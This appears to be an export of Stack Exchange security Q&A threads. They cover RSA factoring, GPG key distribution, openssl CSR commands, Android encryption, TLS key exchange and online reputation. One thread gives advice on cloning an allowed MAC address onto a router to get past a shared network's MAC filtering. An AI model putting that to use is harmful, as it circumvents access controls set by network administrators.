<p>Your ""512-bits in 12μs"" is completely bogus. Let's see from where it comes. 1999 was the year when the first 512-bit general factorization was performed, on a challenge published by RSA (the company) and called <a href=""http://en.wikipedia.org/wiki/RSA-155#RSA-155"">RSA-155</a> (because the number consisted in 155 decimal digits -- in binary, the length is 512 bits). That factorization took 6 months. At the <a href=""http://en.wikipedia.org/wiki/Eurocrypt"">Eurocrypt event</a> organized the same year (in May; at that time the 512-bit factorization effort had begun but was not completed yet), <a href=""http://en.wikipedia.org/wiki/Adi_Shamir"">Adi Shamir</a>, from the Weizmann Institute, presented a theoretical device called <a href=""http://en.wikipedia.org/wiki/TWINKLE"">TWINKLE</a> which, supposedly, may help quite a bit in a factorization effort. It should consist in a huge number of diodes flashing at carefully selected frequencies, in a kind of black tube. Shamir brought a custom device which, from 10 meters away, looked like a coffee machine. He asked for people to switch off the light, so that the Eurocrypt attendee could marvel at the <em>four</em> red diodes flashing at invervals of 2, 3, 5 and 7 seconds. Ooh! and Aah! they went, although the actual machine, would it be built, would require a few millions of diodes and frequencies in the 10 or 100 <em>gigahertz</em>. So the idea is fun (at least for researchers in cryptology, who are known to have a strange sense of humor) but has not gone beyond the theoretical sketch step yet. Shamir is a great showman.</p>

<p>However, TWINKLE is only ""help"". The best known factorization algorithm is called the <a href=""http://en.wikipedia.org/wiki/General_number_field_sieve"">General Number Field Sieve</a>; the two algorithms which come next are the <a href=""http://en.wikipedia.org/wiki/Quadratic_sieve"">Quadratic Sieve</a> and the <a href=""http://en.wikipedia.org/wiki/Lenstra_elliptic_curve_factorization"">Elliptic Curve Method</a>. A 512-bit number is out of reach of QS and ECM with today's technology, and a fortiori with 1999's technology. GNFS is very complex (mathematically speaking), especially since it requires a careful selection of some critical parameters (""polynomial selection""). So there must be an initial effort by very smart brains (with big computers, but brains are the most important here). Afterward, GNFS consists in two parts, the <em>sieve</em> and the <em>linear reduction</em>. The sieve can be made in parallel over hundreds or thousand of machines, which must still be relatively big (in RAM), but this is doable. The linear reduction involves computing things with a matrix which is too big to fit in a computer (by several orders of magnitude, and even if we assume that the said computer has terabytes of fast RAM). There are algorithms to keep the matrix (which is quite sparse) in a compressed format and still be able to compute on that, but this is hard. In the 512-bit factorization, sieving took about 80% of the total time, but for bigger numbers the linear reduction is the bottleneck.</p>

<p>TWINKLE is only about speeding up the sieving part. It does nothing about the linear reduction. In other words, it speeds up the part which is easy (relatively speaking). Even a TWINKLE-enhanced sieving half would be nowhere near 12μs. Instead, it would rather help bringing a four month sieving effort down to, say, three weeks. Which is good, in a scientific way, but not a record breaker, especially since linear reduction dominates for larger sizes. The 12μs figure seems to come from a confusion with an even more mythical beast, the <a href=""http://en.wikipedia.org/wiki/Quantum_computer"">Quantum Computer</a>, which could easily factor big numbers if a QC with 512 ""qubits"" could be built. D-Wave has recently announced a quantum computer with 128 qubits, but it turned out that these were not ""real"" qubits, and they are unsuitable for factorization (they still can do, theoretically, some efficient approximations in optimization problems, which is great but basically not applicable to cryptography, because cryptographic algorithms are not amenable to approximations -- they are designed so that a single wrong bit scrambles the whole thing). The best ""real"" QC so far seems to be the prototype by IBM with, as far as I recall, has 5 qubits, enabling it to establish that 15 is equal to 3 times 5.</p>

<p>The current RSA factorization record is for <a href=""http://en.wikipedia.org/wiki/RSA-768#RSA-768"">a 768-bit integer</a>, announced in December 2009. It took four years and involved the smartest number theorists currently living on Earth, including Lenstra and Montgomery, who have somewhat god-like status in those circles. I recently learned that the selection of the parameters for a 1024-bit number factorization has begun (that's the ""brainy"" part); the sieving is technically feasible (it will be expensive and involve years of computation time on many university clusters) but, for the moment, nobody knows how to do the linear reduction part for a 1024-bit integer. So do not expect a 1024-bit break any time soon.</p>

<p>Right now, a dedicated amateur using the published code (e.g. <a href=""http://sourceforge.net/projects/msieve/"">Msieve</a>) may achieve a 512-bit factorization if he has access to powerful computers (several dozens big PC, and at least one clock full of fast RAM) and a few months of free time; basically, ""dedicated amateur"" means ""bored computer science student in a wealthy university"". Anything beyond 512 bits is out of reach of an amateur.</p>

<p><strong>Summary:</strong> in your code, you can return ""practically infinite"" as cracking time for all key lengths. A typical user will not break a 1024-bit RSA key, not now and not in ten years either. There are about a dozen people on Earth who can, with any credibility, claim that it is conceivable, with a low but non-zero probability, that they <em>might</em> be able to factor a single 1024-bit integer at some unspecified time before year 2020.</p>

<p>(However, it is extremely easy to botch an implementation of RSA or of any application using RSA in such a way that what confidential data it held could be recovered without bothering with the RSA key at all. If you use 1024-bit RSA keys, you can be sure that when your application will be hacked, it will not be through a RSA key factorization.) </p>
","4528"
"How should I distribute my public key?","88431","","<p>I've just started to use GPG and created a public key. It is kind of pointless if no-one knows about it. How should I distribute it? Should I post it on my profile on Facebook and LinkedIn? How about my blog? What are the risks?</p>
","<p>Best way to distribute your key is by using one of the key servers that are available, such as <a href=""http://keyserver.ubuntu.com/"" rel=""noreferrer"">keyserver.ubuntu.com</a>, <a href=""http://pgp.mit.edu/"" rel=""noreferrer"">pgp.mit.edu</a> or <a href=""https://keyserver.pgp.com"" rel=""noreferrer"">keyserver.pgp.com</a>.</p>

<p>If you use <a href=""https://apps.ubuntu.com/cat/applications/seahorse/"" rel=""noreferrer"">Seahorse</a> (default key manager under Ubuntu), it automatically syncs your keys to one of these servers. Users can then look up your key using your email address or keyid. </p>

<p>If you wanted to post your public key on LinkedIn or your blog, you can either upload the key to your server or just link to the page for your key on one of the keyservers above. Personally, I would upload it to one of the keyservers and link to it, as it is easier to keep it up-to-date in one place, instead of having the file in loads of different locations. You could also share your keyid with people, and they can then receive your key using <code>gpg --recv-keys</code>.</p>

<p>If you wanted to post your public key on Facebook, there is a field to place it under the Contact Info section of your profile. You can also change your Facebook security settings to use this same public key to encrypt their emails to you.</p>

<p>For example, here's <a href=""https://pgp.mit.edu/pks/lookup?op=get&amp;search=0xE493B06DD070AFC8"" rel=""noreferrer"">my public key</a>. </p>

<p>To my knowledge, there are no risks associated with publishing your public key.</p>
","412"
"Provide subjectAltName to openssl directly on command line","88275","","<p>Is it possible to provide a subjectAltName-Extension to the <code>openssl</code> <code>req</code> module directly on the command line? I know it's possible via a openssl.cnf file but that's not really elegant for batch-creation of CSRs.</p>
","<p>Based on <a href=""http://openssl.6102.n7.nabble.com/cmd-line-and-subjectAltName-td47538.html#a47548"" rel=""noreferrer"">link</a> from DarkLighting, here's the command I came up with using nested subshells.</p>

<pre><code>openssl req -new -sha256 \
    -key domain.key \
    -subj ""/C=US/ST=CA/O=Acme, Inc./CN=example.com"" \
    -reqexts SAN \
    -config &lt;(cat /etc/ssl/openssl.cnf \
        &lt;(printf ""\n[SAN]\nsubjectAltName=DNS:example.com,DNS:www.example.com"")) \
    -out domain.csr
</code></pre>

<p>All one line:</p>

<pre><code>openssl req -new -sha256 -key domain.key -subj ""/C=US/ST=CA/O=Acme, Inc./CN=example.com"" -reqexts SAN -config &lt;(cat /etc/ssl/openssl.cnf &lt;(printf ""[SAN]\nsubjectAltName=DNS:example.com,DNS:www.example.com"")) -out domain.csr
</code></pre>

<p>Example use:</p>

<pre><code>user@hostname:~$ openssl req -new -sha256 -key domain.key -subj ""/C=US/ST=CA/O=Acme, Inc./CN=example.com"" -reqexts SAN -config &lt;(cat /etc/ssl/openssl.cnf &lt;(printf ""\n[SAN]\nsubjectAltName=DNS:example.com,DNS:www.example.com\n"")) -out domain.csr
user@hostname:~$ openssl req -in domain.csr -text -noout
Certificate Request:
    Data:
        Version: 0 (0x0)
        Subject: C=US, ST=CA, O=Acme, Inc., CN=example.com
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:a8:05:50:86:49:98:c8:05:01:e9:50:18:7f:2f:
                    b4:89:09:29:d1:c1:58:d8:14:bb:58:1d:25:50:11:
                    bb:43:d8:28:03:a5:de:59:49:bb:d2:f7:d3:79:5c:
                    c6:99:2c:98:ff:99:23:8c:df:96:7c:ea:4b:62:2a:
                    a4:c2:84:f5:5d:62:7f:7d:c4:7c:e2:c3:db:e6:58:
                    03:c2:26:9d:02:da:bb:84:d9:11:82:fe:38:12:9b:
                    c7:b6:ff:b2:40:30:38:b1:44:d8:47:1d:43:4a:29:
                    58:6b:49:ec:33:d7:dc:a7:1b:90:05:3a:f5:e6:16:
                    98:08:5d:2d:7e:b4:ea:a2:a4:b1:84:89:f7:f1:c4:
                    67:a6:a1:06:70:dd:4e:6b:0c:f8:b5:9b:bc:3f:06:
                    ee:90:d6:86:29:52:d3:af:f6:d4:2f:c6:cf:4b:5a:
                    b8:cd:01:74:6d:5c:25:a8:02:1c:7c:e8:66:3d:46:
                    07:b1:9d:ef:cc:eb:90:b6:bf:7b:33:e0:5f:b2:9b:
                    e8:b4:12:67:2f:8d:0d:9b:54:9d:95:6e:09:83:cb:
                    f3:5b:1f:31:8e:3b:ca:4e:08:e0:40:c0:60:40:72:
                    dd:0d:3e:99:ec:7c:ac:c4:3c:ba:85:9d:d9:d9:6b:
                    02:2e:bf:a8:a3:02:1d:eb:c8:58:e3:04:b3:a5:f1:
                    67:37
                Exponent: 65537 (0x10001)
        Attributes:
        Requested Extensions:
            X509v3 Subject Alternative Name: 
                DNS:example.com, DNS:www.example.com
    Signature Algorithm: sha256WithRSAEncryption
         a2:1d:1a:e8:56:43:e7:e5:c7:c1:04:c1:6a:eb:d5:70:92:78:
         06:c1:96:fa:60:e2:5f:3c:95:ee:75:ed:70:52:c1:f0:a7:54:
         d2:9f:4a:2f:52:0f:d4:27:d8:13:73:1f:21:be:34:3f:0a:9c:
         f1:2a:5c:98:d4:28:b8:9c:78:44:e8:ea:70:f3:11:6b:26:c3:
         d6:29:b3:25:a0:81:ea:a2:55:31:f2:63:c8:60:6d:68:e3:ab:
         24:c9:46:33:92:8f:f2:a7:72:43:c6:aa:bd:8d:e9:6f:64:64:
         9e:fe:30:48:3f:06:2e:58:7c:b5:ef:b1:4d:c3:84:cc:02:a5:
         58:c3:3f:d8:ed:98:c7:54:b9:5e:50:44:5e:be:99:c2:e4:03:
         81:4b:1f:47:9a:b0:4d:74:7b:10:29:2f:84:fd:d1:70:88:2e:
         ea:f3:42:b7:06:94:4a:06:f6:92:10:4c:ce:de:65:89:2d:0a:
         f1:0f:79:90:02:a4:b9:6d:b8:39:db:de:6e:34:61:4f:21:36:
         a0:b5:73:2b:2b:c6:7e:2f:f2:e5:1e:51:9f:85:c8:17:9c:1a:
         b6:59:b0:41:a7:06:c8:5b:f4:88:92:c9:34:71:9d:73:f0:2e:
         31:ae:ed:ab:35:0e:b4:8a:9a:72:7c:6f:7a:3e:5d:66:49:26:
         26:99:e1:69
</code></pre>
","91556"
"Are there actually any advantages to Android full-disk encryption?","87392","","<p>So, since Android 3, devices can perform <a href=""http://source.android.com/tech/encryption/android_crypto_implementation.html"">boot-time, on-the-fly encryption/decryption</a> of the application storage area (<a href=""http://developer.android.com/reference/android/app/admin/DevicePolicyManager.html#setStorageEncryption%28android.content.ComponentName,%20boolean%29"">NOT</a> the SDcard/removable storage) - essentially full-disk encryption. This requires a password/passphrase/PIN to be set as the screen unlock code and decryption key, unlock patterns cannot be used.</p>

<p>I have a suspicion that there is actually no benefit to enabling encryption, mainly because the memory chips that serve as the ""hard drive"" can't be easily removed like real hard drives in computers. I'm wondering if others can comment on my reasoning.</p>

<p><strong>Scenario 1</strong>: Device is lost, or stolen by an opportunistic thief (i.e. unsophisticated)<br>
With encryption -> Finder/thief can't gain access<br>
With no encryption but with screen lock -> Finder/thief can't gain access</p>

<p><strong>Scenario 2</strong>: Device is stolen by a sophisticated attacker, but they must leave no trace of the attack (therefore chip-off methods are excluded and the phone must be returned before the loss is discovered)<br>
With encryption -> Finder/thief can't gain access<br>
With no encryption but with screen lock -> Finder/thief can't gain access</p>

<p><strong>Scenario 3</strong>: Device is stolen by a determined attacker, and the owner made to reveal the passcode under duress. Android doesn't have Truecrypts <a href=""http://www.truecrypt.org/docs/?s=plausible-deniability"">plausible deniability</a> features.<br>
With encryption -> Attacker gains access<br>
With no encryption but with screen lock -> Attacker gains access</p>

<p>Are there any scenarios I've missed? So my conclusion is that there is no point to enabling full device encryption on Android - a screen lock will do. Discuss! (I am quite happy to be proven wrong, I just can't see how there is a benefit to it)</p>
","<p>The advantages are limited, but there are nonetheless scenarios where encryption helps.</p>

<p>In any scenario where the attacker obtains the password¹ (with <a href=""http://www.xkcd.com/538/"">lead pipe cryptography</a>, or far more realistically by <a href=""https://db.usenix.org/events/woot10/tech/full_papers/Aviv.pdf"">reading the unlock pattern on the screen</a> or brute force on the PIN), there is clearly no advantage to full disk encryption. So how could the attacker obtain the data without obtaining the password?</p>

<p>The attacker might use a software vulnerability to bypass the login screen. A buffer overflow in <code>adbd</code>, say.</p>

<p>The attacker may be able to access the built-in flash memory without booting the device. Perhaps through a software attack (can the device be tricked into booting from the SD card? Is a debug port left open?); perhaps through a hardware attack (you postulate a thief with a lead pipe, I postulate a thief with a soldering iron).</p>

<p>Another use case for full-disk encryption is when the attacker does not have the password yet. The password serves to unlock a unique key which can't be brute-forced. If the thief unwittingly lets the device connect to the network before unlocking it, and you have noticed the theft, you may be able to trigger a fast remote wipe — just wipe the key, no need to wipe the whole device. (I know this feature exists on recent iPhones and Blackberries; presumably it also exists or will soon exist on Android devices with full-disk encryption.)</p>

<p>If you're paranoid, you might even trigger a key wipe after too many authencation failures. If that was you fumbling, you'd just restore the key from backup (you back up your key, right? That's availability 101). But the thief is a lot less likely to have access to your backup than to your phone.</p>

<p>¹ <sub> Password, passphrase, PIN, passgesture, whatever. </sub>  </p>
","10531"
"What is the difference between an X.509 ""client certificate"" and a normal SSL certificate?","85787","","<p>I am setting up a web service through which my company will talk to a number of business customers' services.  We will be exchanging information using SOAP.  I would like to handle authentication with SSL certificates provided by both parties, but I'm a bit lost on whether there's a fundamental difference between the types of certificates.</p>

<p>When people talk about HTTPS, they talk about getting an SSL certificate from Verisign or another authority.  When they talk about client-side authentication, they talk about getting an X.509 certificate. Are these two words for the same thing, can one be turned into the other, or is some other difference that I'm not grasping?</p>
","<p>An X509 Certificate is a type of public key in a public/private key pair.  These key pairs can be used for different things, like encryption via SSL, or for identification.  SSL Certificates are a type of X509 certificate.  SSL works by encrypting traffic as well as verifying the party (Verisign trusts this website to be who they say they are, therefore you probably could too).  Verisign acts as a Certificate Authority (CA).  The CA is trusted in that everything that it says should be taken as truth (Running a CA requires major security considerations).  Therefore if a CA gives you a certificate saying that it trusts that you are really you, you have a user certificate/client certificate.</p>

<p>Some of these types of certificates can be used across the board, but others can only be used for certain activities.</p>

<p>If you open a certificate in Windows (browse to something over SSL in IE and look at the certificate properties) or run certmgr.msc and view a certificate, look at the Details tab > Key Usage.  That will dictate what the certificate is allowed to do/be used for.</p>

<p>For SOAP, the certificate can be used for two things: identification and encryption.  Well, three if you include message signatures (message hashing).</p>

<p>Client certificates identify the calling client or user.  When the application makes a SOAP request, it hands the certificate to the web service to tell it who is making the request.</p>
","1441"
"What is ECDHE-RSA?","85708","","<p>What is the difference between ECDHE-RSA and DHE-RSA?</p>

<p>I know that DHE-RSA is (in one sentence) Diffie Hellman signed using RSA keys. Where DH is used for forward secrecy and RSA guards against MITM, but where do the elliptic curves in ECDHE-RSA are exactly used? What upsides has ECDHE-RSA over DHE-RSA?</p>
","<p>ECDHE suites use elliptic curve diffie-hellman key exchange, where DHE suites use normal diffie-hellman. This exchange is signed with RSA, in the same way in both cases.</p>

<p>The main advantage of ECDHE is that it is significantly faster than DHE. <a href=""http://vincent.bernat.im/en/blog/2011-ssl-perfect-forward-secrecy.html"">This blog article</a> talks a bit about the performance of ECDHE vs. DHE in the context of SSL.</p>
","14732"
"How do I secure my REST API?","84370","","<p>In detail here's the problem: </p>

<p>I'm building an Android app, which consumes my REST API on the back-end. I need to build a Registration and Login API to begin with. After searching with Google for a while, I feel like there are only two approaches that I can take. </p>

<ul>
<li>During Registration, I use <strong><em>https</em></strong> and get the user's credentials; save it in my DB against the username(server side). During Login, again I use <strong><em>https</em></strong>, and ask the user's credentials; verify the hashed password on the DB and return him a session ID, which I'm planning to never expire unless he Logs Out. Further any other API calls (GET/POST) that the user makes, will be accompanied with this session ID so that I can verify the user. </li>
</ul>

<p>But in the above approach I'm forced to use <strong><em>https</em></strong> for any API call, else I'm vulnerable to <a href=""http://en.wikipedia.org/wiki/Man-in-the-middle_attack"" rel=""noreferrer"">Man in The Middle Attack</a>, i.e. if anyone sniffs over my session ID, he can reconstruct similar GET/POST requests which I wouldn't want. <em>Am I right with the above assumption?</em></p>

<ul>
<li>The second option is to follow the path of <a href=""http://www.thebuzzmedia.com/designing-a-secure-rest-api-without-oauth-authentication/"" rel=""noreferrer"">Amazon Web Services</a>, where I use public/private key authentication. When a user registers I use a <strong><em>https</em></strong> API to save his/her credentials in the DB. From then on I use the user's hashed password as the private key. Any further API calls that the user makes will be having a hashed blob of the request URL using the user's private key. On the server side I reconstruct the hash using the saved private key. If the hash is a match I let the user do his task, else reject. In this option I need to use <strong><em>https</em></strong> only for the registration API. The REST can go on on <strong><em>http</em></strong>. </li>
</ul>

<p>But here the disadvantage is, that I'm forced to host my Registration API in a separate Virtual Directory (I'm using IIS and I'm not sure if I can host both http and https APIs in the same Virtual Directory). Hence I'm forced to develop the Registration API in a separate project file. <em>Again Am I right with the above assumption?</em> </p>

<p><strong>Edit:</strong> I'm using ASP.NET MVC4 to build the web API.</p>

<p>The reason I'm reluctant to use <strong><em>https</em></strong> for all of my REST API calls is that I feel it's not lightweight and creates more network payload, which may not be best suited for a mobile app. Further encryption/decryption and extra handshake required may further affect a mobile's battery Life? <em>Or is it not significant?</em></p>

<p><em>Which of the above two approaches would you suggest?</em></p>

<p>PS: We went with Https everywhere, and it was the best decision. More of that on my <a href=""http://theawesomeguy.com/"" rel=""noreferrer"">blog</a>.</p>
","<p>I'd go with SSL/TLS everywhere (since you control both sides, forcing TLS 1.2 should be feasible). It's relatively simple to use, and you get a lot of security features for free. For example if you don't use SSL, you'll need to worry about replay attacks.</p>

<p>If you're worried about performance, make sure session resumption is supported by both the server and the client. This makes later handshakes <em>much</em> cheaper. Since the handshake is quite expensive in SSL compared to the encryption of the actual data, this reduces overall load considerably.</p>

<p>If you use HTTP 2, you can even send multiple requests over a single connection, that way you avoid the complete TCP and SSL handshake overhead on later requests.</p>
","19934"
"Is there any particular reason to use Diffie-Hellman over RSA for key exchange?","83853","","<p>I often see RSA being recommended as a method of key exchange. However, the Diffie-Hellman key exchange method appears to be secure as well.</p>

<p>Is there any considerations one should take into account that would lead to using one algorithm over the other? </p>
","<p>The situation can be confused, so let's set things right.</p>

<p><a href=""http://www.rsa.com/rsalabs/node.asp?id=2125"">RSA</a> is <em>two</em> algorithms, one for asymmetric encryption, and one for <a href=""http://en.wikipedia.org/wiki/Digital_signature"">digital signatures</a>. These are two distinct beast; although they share the same core mathematical operation and format for keys, they do different things in different ways. Diffie-Hellman is a <a href=""http://en.wikipedia.org/wiki/Key_exchange"">key exchange</a> algorithm, which is yet another kind of algorithm. Since the algorithms don't do the same thing, you could prefer one over the other depending on the usage context.</p>

<p>Asymmetric encryption and key exchange are somewhat equivalent: with asymmetric encryption, you can do a key exchange by virtue of generating a random symmetric key (a bunch of random bytes) and encrypting that with the recipient's public key. Conversely, you can do asymmetric encryption with key exchange by using the key resulting from the key exchange to encrypt data with a symmetric algorithm, e.g. <a href=""http://en.wikipedia.org/wiki/Advanced_Encryption_Standard"">AES</a>. Moreover, Diffie-Hellman is a one-roundtrip key exchange algorithm: recipient sends his half (""DH public key""), sender computes his half, obtains the key, encrypts, sends the whole lot to the recipient, the recipient computes the key, decrypts. This is compatible with a one-shot communication system, assuming a pre-distribution of the public key, i.e. it works with emails.</p>

<p>So for the rest of this answer, I assume we are talking about RSA <em>encryption</em>.</p>

<hr />

<p><a href=""http://en.wikipedia.org/wiki/Perfect_forward_secrecy""><strong>Perfect Forward Secrecy</strong></a> is a nifty characteristic which can be summarized as: actual encryption is done with a key which we do not keep around, thus immune to ulterior theft. This works only in a setup in which we do not want to keep the data encrypted, i.e. not for emails (the email should remain encrypted in the mailbox), but for data transfer like <a href=""http://tools.ietf.org/html/rfc5246"">SSL/TLS</a>.</p>

<p>In that case, to get PFS, you need to generate a transient key pair (asymmetric encryption or key exchange) for the actual encryption; since you usually <em>also</em> want some sort of authentication, you may need another non-transient key pair at least on one side. This is what happens in SSL with the ""DHE"" cipher suites: client and server use DH for the key exchange, with newly generated DH keys (not stored), but the server also needs a permanent key pair for signatures (of type RSA, DSA, ECDSA...).</p>

<p>There is nothing which intrinsically prohibits generating a transient RSA key pair. Indeed, this <em>was</em> supported in older versions of SSL; see <a href=""http://tools.ietf.org/html/rfc2246"">TLS 1.0</a>, sectin 7.4.3. In that case, use of an ephemeral RSA key was mandated not for PFS, but quite the opposite: so that encryption keys, while not stored, could be broken afterwards, even if the server's permanent key was too large to be thus brutalized.</p>

<p>There is, however, an <strong>advantage of DH over RSA</strong> for generating ephemeral keys: producing a new DH key pair is <em>extremely fast</em> (provided that some ""DH parameters"", i.e. the group into which DH is computed, are reused, which does not entail extra risks, as far as we know). This is not a really strong issue for big servers, because a very busy SSL server could generate a new ""ephemeral"" RSA key pair every ten seconds for a very small fraction of his computing power, and keep it in RAM only, and for only ten seconds, which would be PFSish enough.</p>

<p>Nevertheless, ephemeral RSA has fallen out of fashion, and, more importantly, out of standardization. <em>In the context of SSL</em>, if you want PFS, you need to use ephemeral DH (aka ""DHE""), because that's what is defined and supported by existing implementations.</p>

<hr />

<p>If you do <em>not</em> want PFS, in particular if you want to be able to eavesdrop on your own connections or the connections of your wards (in the context of a sysadmin protecting his users through some filters, or for some debug activities), you need non-ephemeral keys. There again, RSA and DH can be used. However, still in the context of SSL, non-ephemeral DH requires that the server's key, <em>in its X.509 certificate</em>, contains a DH public key.</p>

<p>DH public keys in certificates were pushed by the US federal government back in the days when RSA was patented. But these days are long gone. Moreover, DH support was never as wide as RSA support. This is indeed an interesting example: DH was government approved, and standardized by an institutional body (as <a href=""http://webstore.ansi.org/RecordDetail.aspx?sku=ANSI%20X9.42:2003"">ANSI X9.42</a>); on the other hand, RSA was standardized by a private company who was not officially entitled in any way to produce standards. <strong>But</strong> the RSA standard (<a href=""http://www.rsa.com/rsalabs/node.asp?id=2125"">PKCS#1</a>) was free for anyone to read, and though there was a patent, it was valid only in the USA, not the rest of the world; and in the USA, RSA (the company) distributed a free implementation of the algorithm (free as long as it was for non-commercial usages). Amateur developers, including Phil Zimmerman for PGP, thus used RSA, not DH. The price of the standard is nothing for a company, but it can mean a lot for an individual. This demonstrates the impetus that can originate, in the software industry, from amateurs.</p>

<p>So that's one <strong>advantage of RSA over DH</strong>: standard is freely available.</p>

<hr />

<p><strong>For security</strong>, RSA relies (more or less) on the difficulty of <a href=""http://en.wikipedia.org/wiki/Integer_factorization"">integer factorization</a>, while DH relies (more or less) on the difficulty of <a href=""http://en.wikipedia.org/wiki/Discrete_logarithm"">discrete logarithm</a>. They are distinct problems. It so happens that the best known breaking algorithms for breaking either are variants of the <a href=""http://en.wikipedia.org/wiki/General_number_field_sieve"">General Number Field Sieve</a>, so they both have the same <em>asymptotic complexity</em>. From a high-level view, a 1024-bit DH key is as robust against cryptanalysis as a 1024-bit RSA key.</p>

<p>If you look at the details, though, you may note that the last part of GNFS, the ""linear algebra"" part, which is the bottleneck in the case of large keys, is simpler in the case of RSA. That part is about reducing a terrifyingly large matrix. In the case of RSA, the matrix elements are just bits (we work in <em>GF(2)</em>), whereas for DH the matrix elements are integer modulo the big prime <em>p</em>. This means that the matrix is one thousand times bigger for DH than for RSA. Since matrix size is the bottleneck, we could state that DH-1024 is <em>stronger</em> than RSA-1024.</p>

<p>So that's one more advantage of DH: it can be argued that it gives some extra robustness over RSA keys <em>of the same size</em>.</p>

<p>Still for security, DH generalizes over other groups, such as <a href=""http://en.wikipedia.org/wiki/Elliptic_curve_cryptography"">elliptic curves</a>. Discrete logarithm on elliptic curves is not the same problem as discrete logarithm modulo a big prime; GNFS does not apply. So there is not <em>one</em> Diffie-Hellman, but <em>several</em> algorithms. ""Cryptodiversity"" is a good thing to have because it enables us to switch algorithms in case some researcher finds a way to easily break some algorithms.</p>

<hr />

<p>As for <strong>performance</strong>:</p>

<ul>
<li>RSA <em>encryption</em> (with the public key) is substantially cheaper (thus faster) than any DH operation (even with elliptic curves).</li>
<li>RSA <em>decryption</em> (with the private key) entails more or less the same amount of work as DH key exchange with similar resistance. DH is a bit cheaper if it uses a permanent key pair, but a bit more expensive if you include the cost for building an ephemeral key pair.</li>
<li>In the case of SSL and DHE_RSA, the server must generate a DH key pair <em>and</em> sign it, and the signature includes the client and server random values, so this must be done for each connection. So choosing ""DHE_RSA"" instead of ""RSA"" kind-of doubles the CPU bill on the server for SSL -- not that it matters much in practice, though. It takes a very busy server to notice the difference.</li>
<li>A DH public key is bigger to encode than a RSA public key, <em>if</em> the DH key includes the DH parameters; it is smaller otherwise. In the case of SSL, using DHE_RSA instead of RSA means exchanging one or two extra kilobytes of data -- there again, only once per client (because of SSL session reuse), so that's hardly a crucial point. In some specialized protocols, ECDH (with elliptic curves) gets an important edge because the public elements are much smaller.</li>
</ul>

<p>If you are designing a protocol in a constrained situation (e.g. involving smart cards and I/O over infrared or anything similarly low-powered), <a href=""http://en.wikipedia.org/wiki/Elliptic_curve_Diffie%E2%80%93Hellman"">ECDH</a> will probably be more attractive than RSA.</p>

<hr />

<p><strong>Summary:</strong> you will usually prefer RSA over DH, or DH over RSA, based on interoperability constraints: one will be more supported than the other, depending on the context. Performance rarely matters (at least not as much as is often assumed). <em>For SSL</em>, you'll want DH because it is actually DHE, and the ""E"" (as ephemeral) is nice to have, because of PFS.</p>
","35521"
"How to bypass restrictive mac address filtering on home network (not malicious)","82497","","<p><strong>Background</strong></p>

<p>A short sketch of my situation before I formulate my question: I am on a large home network, which is privately administered by a couple of admins. The network consists of a lan and a wireless lan, and controls access centrally by filtering mac addresses (and denying/allowing based on whether they allow that specific mac address). </p>

<p>I have two computers that I have registered and use (and pay for monthly) on this network, one wireless connection (laptop) and one cable connection (desktop). So I have two mac addresses that are allowed on the network, and are allowed access to the internet through the network.</p>

<p><strong>The problem</strong></p>

<p>The problem is that the wireless access is very unreliable, and is unusable for me. The admins of the network don't have a lot of time and are a little lax, so they won't help me with my wireless access problems, even after repeated complaints. They basically told me to fix it myself. Which leaves me with a connection that I'm paying for, but unable to use. I don't have control over the main routers, so I am kind of cut off from the internet on my laptop because of this, which is very frustrating.</p>

<p><strong>My (partial) solution</strong></p>

<p>Fortunately, the mac address filtering is rather simple. The wireless mac address that I've registered does not allow me to access the cable lan part of the network. So I have only one valid mac address (from the desktop) that is allowed on the cable lan part of the network.</p>

<p>What I have done is patch a small router (E-Tech RTVP03) to the main network, change it's mac address to the allowed (desktop) mac address, and patch my computer and laptop to the router. This sort of works (internet access works), but there are some problems that I wasn't able to fix:</p>

<ul>
<li>The mac address of my router and desktop computer network card is now the same, which causes a lot of conflicts. I have tried to change the mac address of my network card, but that didn't help (or maybe the changing of the mac address didn't work, I'm not sure).</li>
<li>Because the router is between my computers and the rest of the network, I can no longer discover any other computers on the network. Which is a shame, because we share a lot of files on it. Could I change the settings so this becomes a possibility again?</li>
</ul>

<p><strong>My question</strong></p>

<p>So basically, what I want the router to do, is be as transparent as possible, and only change the mac address information that is passed to the main network (to bypass the mac filtering), and to allow me to share one connection over two computers. </p>

<p>I still want to be able to share files with the main network, and all I want to do is to be able to connect both my computers to the cable network, and have full internet (and network) access with them (because after all, I'm paying for it).</p>

<p>Can anyone come up with a good solution for this?</p>
","<p>All though I think this is not the correct way to solve your problem:</p>

<p>What I would do is get another networking card for your desktop and a router that is also wifi capable. </p>

<p>Get a box that's DD-wrt/open-wrt capable and change the MAC address to the one of your desktop or just get them to insert the MAC address of your router. After that you can just use your own router as WIFI AP and physical internet AP. No you won't be able to discover other devices.</p>

<p>I'm not sure how the auto discovery function works, but I think it will scan devices in the same subnet. Since you are behind another router this will not be case. What you can try is to directly connect to the ip of the fileserver.</p>
","14784"
"Is it bad practice to use your real name online?","82388","","<p>On some accounts I use my real name on-line (Google+/Facebook/Wikipedia/personal blog), others (Q&amp;A/Gaming) I use an alias.</p>

<p>My question is: Security and privacy wise, what can people do with my real name? What are the dangers of using your real name on-line.</p>
","<p>This is actually an interesting new field in infosec - <a href=""https://en.wikipedia.org/wiki/Reputation_management"">reputation management</a>.</p>

<ul>
<li><p>Employers, Law Enforcement and other government agencies, legal professionals, the press, criminals and others with an interest in your reputation will be observing <strong><em>all</em></strong> online activity associated with your real name. </p></li>
<li><p>These ""interested parties"" (snoops) are usually <em>terrible</em> at separating professional and personal life, so you could be made to suffer for unpopular opinions, political or religious convictions, associates or group affiliations <em>they</em> consider ""unsavory"", and any behavior that can be interpreted in the most uncharitable light. (Teachers have been forced to resign for drinking wine responsibly while vacationing in Europe. <a href=""http://web.archive.org/web/20160310003731/http://www.ajc.com/news/news/local/barrow-teacher-fired-over-facebook-still-not-back-/nQmpS/"">No, really.</a>)</p></li>
<li><p>Conversely, you need an online presence, otherwise you will be made to suffer for <a href=""http://www.forbes.com/sites/kashmirhill/2012/03/05/facebook-can-tell-you-if-a-person-is-worth-hiring/"">a lack of things for the snoops to spy on</a> - employers, especially (from Forbes): </p></li>
</ul>

<blockquote>
  <p>Key takeaway for hiring employers: The Facebook page is the first
  interview; if you don’t like a person there, you probably won’t like
  working with them. The bad news for employers, though, who are hoping
  to take the Facebook shortcut: “So many more profiles are restricted
  in what the public can access,” says Kluemper.</p>
</blockquote>

<ul>
